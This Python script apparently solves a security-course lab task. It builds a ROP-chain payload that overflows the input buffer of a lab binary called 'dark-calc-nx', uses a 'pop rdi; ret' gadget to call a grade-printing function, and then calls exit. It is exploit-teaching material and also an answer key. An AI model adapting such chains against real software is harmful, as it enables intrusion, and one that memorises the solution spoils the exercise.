#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

dark-calc-nx runs on the normal stack, which is not executable, so the
exploit is a ROP chain.  input() puts expression[] at rbp-0x10 and saves the
return address at rbp+8, i.e. 24 bytes from the start of the buffer.

    ret             0x401a34   keeps the stack 16-byte aligned for printf
    pop rdi; ret    0x401a33
    4                          grade_eval's argument
    grade_eval      0x401978   prints "Hope A will be your grade!"
    pop rdi; ret    0x401a33
    0                          exit status
    exit@plt        0x4016e0
"""
import struct
import sys

RET = 0x401A34        # ret
POP_RDI = 0x401A33    # pop rdi; ret
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


payload = b"A" * 24
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(4)
payload += p64(GRADE_EVAL)
payload += p64(POP_RDI)
payload += p64(0)
payload += p64(EXIT_PLT)
sys.stdout.buffer.write(payload)
